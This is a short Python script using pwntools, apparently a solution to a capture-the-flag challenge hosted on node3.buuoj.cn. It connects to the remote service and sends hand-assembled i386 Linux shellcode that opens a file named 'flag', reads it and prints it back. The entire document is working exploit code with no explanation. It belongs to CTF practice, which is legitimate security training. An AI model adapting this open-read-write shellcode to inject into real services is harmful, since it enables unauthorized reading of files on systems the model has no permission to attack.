from pwn import *

r = remote('node3.buuoj.cn', 25674)

# fd = sys_open(file,0,0);
# sys_read(fd,buf,0x30);
# sys_write(1,buf,0x30);
# exit(0)

orw = '''
xor edx, edx
xor ecx, ecx
push ecx
push 0x67616c66
mov ebx, esp
mov eax, 0x5
int 0x80
mov edx, 0x30
mov ecx, esp
mov ebx, eax
mov eax, 0x3
int 0x80
mov ebx, 0x1
mov eax, 0x4
int 0x80
xor ebx, ebx
mov eax, 0x1
int 0x80
'''

r.recvuntil('shellcode:')
r.send(asm(orw, arch='i386', os='linux'))
flag = r.recvline(False)
print(flag)
